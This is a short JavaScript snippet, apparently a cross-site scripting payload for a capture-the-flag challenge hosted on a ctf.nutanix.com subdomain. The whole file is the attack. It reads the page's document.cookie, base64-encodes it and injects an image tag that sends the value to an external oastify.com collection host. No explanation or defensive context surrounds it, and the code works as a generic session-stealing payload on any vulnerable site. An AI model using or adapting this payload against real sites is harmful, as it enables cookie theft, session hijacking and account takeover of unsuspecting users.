const xhr = new XMLHttpRequest();
xhr.open("GET", 'https://nucalc3-6848907864.ctf.nutanix.com/', true);
let ck = document.cookie;
xhr.onreadystatechange = function() {
  document.write('<img src=http://76bxkmc5brdhbfc5f1h6yp0wyn4fs4.oastify.com/?' + btoa(ck) + '>');
};
xhr.send();
